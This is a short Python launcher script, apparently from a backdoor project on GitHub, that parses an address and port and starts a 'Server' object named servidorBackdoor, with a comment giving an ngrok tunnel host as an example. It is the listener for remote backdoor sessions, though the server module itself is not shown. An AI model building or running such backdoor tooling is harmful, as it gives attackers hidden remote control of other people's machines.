#!/usr/bin/python3
# coding: utf-8

__author__ = '@zNairy'
__contact__ = 'Discord: zNairy#7181 | Github: https://github.com/zNairy/'
__version__ = '2.0'

from parserArguments import createSetupParser
from server import Server

def main():
    parser, args = createSetupParser()

    servidorBackdoor = Server(args.address, int(args.port)) # Ex: server = Server('0.tcp.ngrok.io', 4321)#
    servidorBackdoor.run() # iniciando escuta e sessões #


if __name__ == '__main__':
    main()